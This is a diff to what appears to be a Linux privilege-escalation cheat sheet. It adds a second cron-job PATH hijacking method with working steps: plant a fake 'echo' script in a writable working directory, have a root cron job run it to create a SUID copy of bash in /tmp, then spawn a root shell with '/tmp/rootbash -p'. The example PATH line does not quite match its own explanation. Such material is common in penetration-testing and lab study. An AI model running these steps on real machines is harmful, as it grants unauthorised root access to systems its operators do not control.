@@ -542,7 +542,7 @@ chmod +x /path/to/overwritable/script
 
 ### PATH Variable Attack
 
-Requirements:
+Requirements for Attack One:
 
 - Cron job runs as root
 - Cron job uses relative paths
@@ -566,6 +566,30 @@ chmod +s /tmp/rootbash' > /home/user/overwrite
 chmod +x /home/user/overwrite
 
 # Wait for cron job to execute, then run
+/tmp/rootbash -p
+```
+Requirments for Attack Two:
+- Script or Cronjob running as an elevated user(root or equalvent rights)
+- Cron job or script invokes commands(could be any including echo, test, or other misc shell calls) with relative path
+- Working Directory the script/cron is operating in is writeable to you
+
+Example of a vulnrable cron/script to the above:
+```
+PATH=./home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+The "." signifies that any command invokved, bash will first look for it in the current working directory first before referncing the rest of your path. 
+
+Exploitation:
+```bash
+# Create malicious executable in the writebale working directory with the name of a relative call binary
+echo '#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash' > /home/user/echo
+
+# Make it executable 
+chmod +x /home/user/echo
+
+# Wait for cron job to execute, which will execute echo found in the working directory instead of the real one and run
 /tmp/rootbash -p
 ```
 
